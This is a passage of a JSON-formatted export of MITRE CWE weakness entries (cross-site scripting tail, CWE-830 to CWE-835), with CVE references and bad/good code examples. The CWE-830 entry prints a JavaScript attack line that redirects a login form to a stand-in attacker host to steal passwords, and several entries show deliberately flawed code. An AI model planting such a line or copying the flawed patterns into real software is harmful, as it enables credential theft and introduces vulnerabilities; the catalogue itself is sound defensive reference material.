browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.", "Effectiveness": "Defense in Depth"}], "ObservedExamples": [{"Reference": "CVE-2001-0520", "Description": "Bypass filtering of SCRIPT tags using onload in BODY, href in A, BUTTON, INPUT, and others.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0520"}, {"Reference": "CVE-2002-1493", "Description": "guestbook XSS in STYLE or IMG SRC attributes.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1493"}, {"Reference": "CVE-2002-1965", "Description": "Javascript in onerror attribute of IMG tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1965"}, {"Reference": "CVE-2002-1495", "Description": "XSS in web-based email product via onmouseover event.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1495"}, {"Reference": "CVE-2002-1681", "Description": "XSS via script in <P> tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1681"}, {"Reference": "CVE-2004-1935", "Description": "Onload, onmouseover, and other events in an e-mail attachment.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1935"}, {"Reference": "CVE-2005-0945", "Description": "Onmouseover and onload events in img, link, and mail tags.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0945"}, {"Reference": "CVE-2003-1136", "Description": "Javascript in onmouseover attribute in e-mail address or URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1136"}], "RelatedAttackPatterns": ["243", "244", "588"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-0565", "Description": "Cross-site Scripting in Packagist pimcore/pimcore prior to 10.3.1. "}]}
{"ID": "830", "Name": "Inclusion of Web Functionality from an Untrusted Source", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the product, potentially granting total access and control of the product to the untrusted source.", "ExtendedDescription": "\n\nIncluding third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.\n\n\nEven if the third party is a trusted source, the product may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the product.\n\n\nThis weakness is common in \"mashup\" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '<SCRIPT SRC=\"http://other.domain.here\">' tags, which causes the code to run in the domain of the product, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.\n\n\nSuch dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "829", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "DemonstrativeExamples": [{"ID": "DX-94", "Entries": [{"IntroText": "This login webpage includes a weather widget from an external website:"}, {"Nature": "Bad", "Language": "HTML", "ExampleCode": "```\n\t<div class=\"header\"> Welcome!\n\t\t<div id=\"loginBox\">Please Login:\n\t\t\t<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">\n\t\t\tUsername: <input type=\"text\" name=\"username\" />\n\t\t\t<br/>\n\t\t\tPassword: <input type=\"password\" name=\"password\" />\n\t\t\t<input type=\"submit\" value=\"Login\" />\n\t\t\t</form>\n\t\t</div>\n\t\t<div id=\"WeatherWidget\">\n\t\t\t<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>\n\t\t</div>\n\t</div>\n```"}, {"BodyText": "This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79)."}, {"BodyText": "For example, user login information could easily be stolen with a single line added to weatherwidget.js:"}, {"Nature": "Attack", "Language": "JavaScript", "ExampleCode": "```\n```\n...Weather widget code....* \n\tdocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";"}, {"BodyText": "This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "831", "Name": "Signal Handler Function Associated with Multiple Signals", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product defines a function that is used as a handler for more than one signal.", "ExtendedDescription": "\n\nWhile sometimes intentional and safe, when the same function is used to handle multiple signals, a race condition could occur if the function uses any state outside of its local declaration, such as global variables or non-reentrant functions, or has any side effects.\n\n\nAn attacker could send one signal that invokes the handler function; in many OSes, this will typically prevent the same signal from invoking the handler again, at least until the handler function has completed execution. However, the attacker could then send a different signal that is associated with the same handler function. This could interrupt the original handler function while it is still executing. If there is shared state, then the state could be corrupted. This can lead to a variety of potential consequences depending on context, including denial of service and code execution.\n\n\nAnother rarely-explored possibility arises when the signal handler is only designed to be executed once (if at all). By sending multiple signals, an attacker could invoke the function more than once. This may generate extra, unintended side effects. A race condition might not even be necessary; the attacker could send one signal, wait until it is handled, then send the other signal.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "364", "ViewID": "1000", "Ordinal": "Primary"}], "CommonConsequences": [{"Scope": ["Availability", "Integrity", "Confidentiality", "Access Control", "Other"], "Impact": ["DoS: Crash, Exit, or Restart", "Execute Unauthorized Code or Commands", "Read Application Data", "Gain Privileges or Assume Identity", "Bypass Protection Mechanism", "Varies by Context"], "Note": "The most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This code registers the same signal handler function with two different signals."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tvoid handler (int sigNum) {\n\t\t...\n\t}\n\tint main (int argc, char* argv[]) {\n\t\tsignal(SIGUSR1, handler)\n\t\tsignal(SIGUSR2, handler)\n\t}\n```"}]}, {"ID": "DX-26", "Entries": [{"IntroText": "This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar *logMessage;\n\tvoid handler (int sigNum) {\n\t\t\tsyslog(LOG_NOTICE, \"%s\\n\", logMessage);\n\t\t\tfree(logMessage);\n```\n/* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}\n\t\n\tint main (int argc, char* argv[]) {\n\t```\n\t\t\tlogMessage = strdup(argv[1]);\n```\n/* Register signal handlers. */* \n\t\t\t\n\t\t\tsignal(SIGHUP, handler);\n\t\t\tsignal(SIGTERM, handler);\n\t\t\t\n\t\t\t */* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);}"}, {"BodyText": "The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:"}, {"BodyText": "- The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.\n\n  - The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.\n\n  - The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\").\n\n  - SIGHUP-handler begins to execute, calling syslog().\n\n  - syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.\n\n  - The attacker then sends SIGTERM.\n\n  - SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\n\n  - The SIGTERM handler is invoked.\n\n  - SIGTERM-handler records the log message using syslog(), then frees the logMessage variable."}, {"BodyText": "At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running."}, {"BodyText": "Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution."}, {"BodyText": "Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "832", "Name": "Unlock of a Resource that is not Locked", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product attempts to unlock a resource that is not locked.", "ExtendedDescription": "Depending on the locking functionality, an unlock of a non-locked resource might cause memory corruption or other modification to the resource (or its associated metadata that is used for tracking locks).", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "667", "ViewID": "1000", "Ordinal": "Primary"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability", "Other"], "Impact": ["DoS: Crash, Exit, or Restart", "Execute Unauthorized Code or Commands", "Modify Memory", "Other"], "Note": "Depending on the locking being used, an unlock operation might not have any adverse effects. When effects exist, the most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit; depending on the implementation of the unlocking, memory corruption or code execution could occur."}], "ObservedExamples": [{"Reference": "CVE-2010-4210", "Description": "function in OS kernel unlocks a mutex that was not previously locked, causing a panic or overwrite of arbitrary memory.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4210"}, {"Reference": "CVE-2008-4302", "Description": "Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4302"}, {"Reference": "CVE-2009-1243", "Description": "OS kernel performs an unlock in some incorrect circumstances, leading to panic.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1243"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "833", "Name": "Deadlock", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "667", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1305", "Ordinal": "Primary"}], "CommonConsequences": [{"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (CPU)", "DoS: Resource Consumption (Other)", "DoS: Crash, Exit, or Restart"], "Note": "Each thread of execution will \"hang\" and prevent tasks from completing. In some cases, CPU consumption may occur if a lock check occurs in a tight loop."}], "ObservedExamples": [{"Reference": "CVE-1999-1476", "Description": "A bug in some Intel Pentium processors allow DoS (hang) via an invalid \"CMPXCHG8B\" instruction, causing a deadlock", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1476"}, {"Reference": "CVE-2009-2857", "Description": "OS deadlock", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2857"}, {"Reference": "CVE-2009-1961", "Description": "OS deadlock involving 3 separate functions", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1961"}, {"Reference": "CVE-2009-2699", "Description": "deadlock in library", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2699"}, {"Reference": "CVE-2009-4272", "Description": "deadlock triggered by packets that force collisions in a routing table", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4272"}, {"Reference": "CVE-2002-1850", "Description": "read/write deadlock between web server and script", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1850"}, {"Reference": "CVE-2004-0174", "Description": "web server deadlock involving multiple listening connections", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0174"}, {"Reference": "CVE-2009-1388", "Description": "multiple simultaneous calls to the same function trigger deadlock.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1388"}, {"Reference": "CVE-2006-5158", "Description": "chain: other weakness leads to NULL pointer dereference (CWE-476) or deadlock (CWE-833).", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5158"}, {"Reference": "CVE-2006-4342", "Description": "deadlock when an operation is performed on a resource while it is being removed.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4342"}, {"Reference": "CVE-2006-2374", "Description": "Deadlock in device driver triggered by using file handle of a related device.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2374"}, {"Reference": "CVE-2006-2275", "Description": "Deadlock when large number of small messages cannot be processed quickly enough.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2275"}, {"Reference": "CVE-2005-3847", "Description": "OS kernel has deadlock triggered by a signal during a core dump.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3847"}, {"Reference": "CVE-2005-3106", "Description": "Race condition leads to deadlock.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3106"}, {"Reference": "CVE-2005-2456", "Description": "Chain: array index error (CWE-129) leads to deadlock (CWE-833)", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2456"}], "RelatedAttackPatterns": ["25"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-3735", "Description": "A deadlock issue was found in the AHCI controller device of QEMU. It occurs on a software reset (ahci_reset_port) while handling a host-to-device Register FIS (Frame Information Structure) packet from the guest. A privileged user inside the guest could use this flaw to hang the QEMU process on the host, resulting in a denial of service condition. The highest threat from this vulnerability is to system availability."}, {"Reference": "CVE-2021-43395", "Description": "An issue was discovered in illumos before f859e7171bb5db34321e45585839c6c3200ebb90, OmniOS Community Edition r151038, OpenIndiana Hipster 2021.04, and SmartOS 20210923. A local unprivileged user can cause a deadlock and kernel panic via crafted rename and rmdir calls on tmpfs filesystems. Oracle Solaris 10 and 11 is also affected."}, {"Reference": "CVE-2022-31621", "Description": "MariaDB Server before 10.7 is vulnerable to Denial of Service. In extra/mariabackup/ds_xbstream.cc, when an error occurs (stream_ctxt->dest_file == NULL) while executing the method xbstream_open, the held lock is not released correctly, which allows local users to trigger a denial of service due to the deadlock. Note: The vendor argues this is just an improper locking bug and not a vulnerability with adverse effects."}, {"Reference": "CVE-2022-31622", "Description": "MariaDB Server before 10.7 is vulnerable to Denial of Service. In extra/mariabackup/ds_compress.cc, when an error occurs (pthread_create returns a nonzero value) while executing the method create_worker_threads, the held lock is not released correctly, which allows local users to trigger a denial of service due to the deadlock. Note: The vendor argues this is just an improper locking bug and not a vulnerability with adverse effects."}, {"Reference": "CVE-2022-31623", "Description": "MariaDB Server before 10.7 is vulnerable to Denial of Service. In extra/mariabackup/ds_compress.cc, when an error occurs (i.e., going to the err label) while executing the method create_worker_threads, the held lock thd->ctrl_mutex is not released correctly, which allows local users to trigger a denial of service due to the deadlock. Note: The vendor argues this is just an improper locking bug and not a vulnerability with adverse effects."}, {"Reference": "CVE-2022-31624", "Description": "MariaDB Server before 10.7 is vulnerable to Denial of Service. While executing the plugin/server_audit/server_audit.c method log_statement_ex, the held lock lock_bigbuffer is not released correctly, which allows local users to trigger a denial of service due to the deadlock."}, {"Reference": "CVE-2022-38791", "Description": "In MariaDB before 10.9.2, compress_write in extra/mariabackup/ds_compress.cc does not release data_mutex upon a stream write failure, which allows local users to trigger a deadlock."}, {"Reference": "CVE-2022-42328", "Description": "Guests can trigger deadlock in Linux netback driver T[his CNA information record relates to multiple CVEs; the text explains which aspects/vulnerabilities correspond to which CVE.] The patch for XSA-392 introduced another issue which might result in a deadlock when trying to free the SKB of a packet dropped due to the XSA-392 handling (CVE-2022-42328). Additionally when dropping packages for other reasons the same deadlock could occur in case of netpoll being active for the interface the xen-netback driver is connected to (CVE-2022-42329)."}, {"Reference": "CVE-2022-42329", "Description": "Guests can trigger deadlock in Linux netback driver T[his CNA information record relates to multiple CVEs; the text explains which aspects/vulnerabilities correspond to which CVE.] The patch for XSA-392 introduced another issue which might result in a deadlock when trying to free the SKB of a packet dropped due to the XSA-392 handling (CVE-2022-42328). Additionally when dropping packages for other reasons the same deadlock could occur in case of netpoll being active for the interface the xen-netback driver is connected to (CVE-2022-42329)."}]}
{"ID": "834", "Name": "Excessive Iteration", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.", "ExtendedDescription": "If the iteration can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory. In many cases, a loop does not need to be infinite in order to cause enough resource consumption to adversely affect the product or its host system; it depends on the amount of resources consumed per iteration.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "691", "ViewID": "1000", "Ordinal": "Primary"}], "CommonConsequences": [{"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (CPU)", "DoS: Resource Consumption (Memory)", "DoS: Amplification", "DoS: Crash, Exit, or Restart"], "Note": "Excessive looping will cause unexpected consumption of resources, such as CPU cycles or memory. The product's operation may slow down, or cause a long time to respond. If limited resources such as memory are consumed for each iteration, the loop may eventually cause a crash or program exit due to exhaustion of resources, such as an out-of-memory error."}], "DetectionMethods": [{"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer\n\t\tForced Path Execution", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)", "Effectiveness": "SOAR Partial"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "High"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)", "Effectiveness": "High"}], "DemonstrativeExamples": [{"ID": "DX-204", "Entries": [{"IntroText": "In this example a mistake exists in the code where the exit condition contained in flg is never called. This results in the function calling itself over and over again until the stack is exhausted."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "void do_something_recursive (int flg)\n {\n\n```\n\t ... // Do some real work here, but the value of flg is unmodified\n\t if (flg) { do_something_recursive (flg); } // flg is never modified so it is always TRUE - this call will continue until the stack explodes\n }\n int flag = 1; // Set to TRUE\n do_something_recursive (flag);\n```"}, {"BodyText": "Note that the only difference between the Good and Bad examples is that the recursion flag will change value and cause the recursive call to return."}, {"Nature": "Good", "Language": "C", "ExampleCode": "void do_something_recursive (int flg)\n {\n\n```\n\t ... // Do some real work here\n\t // Modify value of flg on done condition\n\t if (flg) { do_something_recursive (flg); } // returns when flg changes to 0\n }\n int flag = 1; // Set to TRUE\n do_something_recursive (flag);\n```"}]}, {"ID": "DX-205", "Entries": [{"IntroText": "For this example, the method isReorderNeeded is part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\tboolean isReorder = false;\n\t\t\tint minimumCount = 10;\n\t\t\tint days = 0;\n```\n// get inventory count for book* \n\t\t\tint inventoryCount = inventory.getIventoryCount(bookISBN);\n\t\t\t\n\t\t\t\n\t\t\t *// find number of days until inventory count reaches minimum* \n\t\t\twhile (inventoryCount > minimumCount) {\n\t\t\t```\n\t\t\t\t\tinventoryCount = inventoryCount - rateSold;\n\t\t\t\t\tdays++;\n\t\t\t}\n```\n// if number of days within reorder timeframe* \n\t\t\t\n\t\t\t\n\t\t\t *// set reorder return boolean to true* \n\t\t\tif (days > 0 && days < 5) {\n\t\t\t```\n\t\t\t\tisReorder = true;\n\t\t\t}\n\t\t\treturn isReorder;\n\t}\n```"}, {"BodyText": "However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop, as in the following code."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\t...\n```\n// validate rateSold variable* \n\t\t\tif (rateSold < 1) {\n\t\t\t```\n\t\t\t\treturn isReorder;\n\t\t\t}\n\t\t\t...\n\t}\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2011-1027", "Description": "Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1027"}, {"Reference": "CVE-2006-6499", "Description": "Chain: web browser crashes due to infinite loop - \"bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6499"}], "MappingNotes": {"Usage": "Discouraged", "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-42324", "Description": "Oxenstored 32->31 bit integer truncation issues Integers in Ocaml are 63 or 31 bits of signed precision. The Ocaml Xenbus library takes a C uint32_t out of the ring and casts it directly to an Ocaml integer. In 64-bit Ocaml builds this is fine, but in 32-bit builds, it truncates off the most significant bit, and then creates unsigned/signed confusion in the remainder. This in turn can feed a negative value into logic not expecting a negative value, resulting in unexpected exceptions being thrown. The unexpected exception is not handled suitably, creating a busy-loop trying (and failing) to take the bad packet out of the xenstore ring."}, {"Reference": "CVE-2022-26477", "Description": "The Security Team noticed that the termination condition of the for loop in the readExternal method is a controllable variable, which, if tampered with, may lead to CPU exhaustion. As a fix, we added an upper bound and termination condition in the read and write logic. We classify it as a \"low-priority but useful improvement\". SystemDS is a distributed system and needs to serialize/deserialize data but in many code paths (e.g., on Spark broadcast/shuffle or writing to sequence files) the byte stream is anyway protected by additional CRC fingerprints. In this particular case though, the number of decoders is upper-bounded by twice the number of columns, which means an attacker would need to modify two entries in the byte stream in a consistent manner. By adding these checks robustness was strictly improved with almost zero overhead. These code changes are available in versions higher than 2.2.1."}, {"Reference": "CVE-2022-36083", "Description": "JOSE is \"JSON Web Almost Everything\" - JWA, JWS, JWE, JWT, JWK, JWKS with no dependencies using runtime's native crypto in Node.js, Browser, Cloudflare Workers, Electron, and Deno. The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` PBES2 Count, which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive. This makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish. Under certain conditions, it is possible to have the user's environment consume unreasonable amount of CPU time. The impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means. The `v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option. If users are unable to upgrade their required library version, they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms. They can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether, or they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)."}, {"Reference": "CVE-2022-41861", "Description": "A flaw was found in freeradius. A malicious RADIUS client or home server can send a malformed abinary attribute which can cause the server to crash."}]}
{"ID": "835", "Name": "Loop with Unreachable Exit Condition ('Infinite Loop')", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.", "ExtendedDescription": "If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "834", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "834", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (CPU)", "DoS: Resource Consumption (Memory)", "DoS: Amplification"], "Note": "An infinite loop will cause unexpected consumption of resources, such as CPU cycles or memory. The software's operation may slow down, or cause a long time to respond."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following code the method processMessagesFromServer attempts to establish a connection to a server and read and process messages from the server. The method uses a do/while loop to continue trying to establish the connection to the server when an attempt fails."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint processMessagesFromServer(char *hostaddr, int port) {\n\t\t\t...\n\t\t\tint servsock;\n\t\t\tint connected;\n\t\t\tstruct sockaddr_in servaddr;\n```\n// create socket to connect to server* \n\t\t\tservsock = socket( AF_INET, SOCK_STREAM, 0);\n\t\t\tmemset( &servaddr, 0, sizeof(servaddr));\n\t\t\tservaddr.sin_family = AF_INET;\n\t\t\tservaddr.sin_port = htons(port);\n\t\t\tservaddr.sin_addr.s_addr = inet_addr(hostaddr);\n\t\t\t\n\t\t\tdo {\n\t\t\t```\n```\n// establish connection to server* \n\t\t\t\t\tconnected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// if connected then read and process messages from server* \n\t\t\t\t\tif (connected > -1) {\n\t\t\t\t\t```\n```\n// read and process messages* \n\t\t\t\t\t\t\t...}\n\t\t\t\t\t\n\t\t\t\n\t\t\t *// keep trying to establish connection to the server* \n\t\t\t} while (connected < 0);\n\t\t\t\n\t\t\t\n\t\t\t *// close socket and return success or failure* \n\t\t\t...}"}, {"BodyText": "However, this will create an infinite loop if the server does not respond. This infinite loop will consume system resources and can be used to create a denial of service attack. To resolve this a counter should be used to limit the number of attempts to establish a connection to the server, as in the following code."}, {"Nature": "Good", "Language": "C", "ExampleCode": "```\n\tint processMessagesFromServer(char *hostaddr, int port) {\n\t\t\t...\n```\n// initialize number of attempts counter* \n\t\t\tint count = 0;\n\t\t\tdo {\n\t\t\t```\n```\n// establish connection to server* \n\t\t\t\t\tconnected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// increment counter* \n\t\t\t\t\tcount++;\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// if connected then read and process messages from server* \n\t\t\t\t\tif (connected > -1) {\n\t\t\t\t\t```\n```\n// read and process messages* \n\t\t\t\t\t\t\t...}\n\t\t\t\t\t\n\t\t\t\n\t\t\t *// keep trying to establish connection to the server* \n\t\t\t\n\t\t\t\n\t\t\t *// up to a maximum number of attempts* \n\t\t\t} while (connected < 0 && count < MAX_ATTEMPTS);\n\t\t\t\n\t\t\t\n\t\t\t *// close socket and return success or failure* \n\t\t\t...}"}]}, {"ID": "DX-205", "Entries": [{"IntroText": "For this example, the method isReorderNeeded is part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\tboolean isReorder = false;\n\t\t\tint minimumCount = 10;\n\t\t\tint days = 0;\n```\n// get inventory count for book* \n\t\t\tint inventoryCount = inventory.getIventoryCount(bookISBN);\n\t\t\t\n\t\t\t\n\t\t\t *// find number of days until inventory count reaches minimum* \n\t\t\twhile (inventoryCount > minimumCount) {\n\t\t\t```\n\t\t\t\t\tinventoryCount = inventoryCount - 